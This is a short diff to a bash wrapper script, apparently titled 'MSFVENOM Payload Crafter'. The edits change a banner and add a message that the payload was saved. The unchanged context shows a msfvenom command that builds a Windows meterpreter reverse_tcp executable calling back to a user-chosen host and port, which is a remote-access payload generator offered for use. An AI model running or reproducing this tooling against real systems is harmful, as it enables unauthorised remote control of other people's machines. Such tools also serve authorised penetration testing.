@@ -3,7 +3,7 @@ COWSAY=/usr/games/cowsay
 function banner() {
 if [ -f "$COWSAY" ] 
 then
-cowsay -f eyes MSFVENOM
+cowsay -f eyes MSFVENOM Payload Crafter
 else
 echo "
 ╔╦╗╔═╗╔═╗  ╦  ╦┌─┐┌┐┌╔═╗┌┬┐
@@ -49,6 +49,9 @@ elif [ "$choice" -eq 1 ]
 then
 read -p "Output file-name(file.exe)~: " output_win
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $output_win
+if [ -f "$output_win" ]
+then echo "Payload saved as $output_win" 
+fi
 fi
 }
 
@@ -57,4 +60,3 @@ banner
 payload
 }
 main
-              
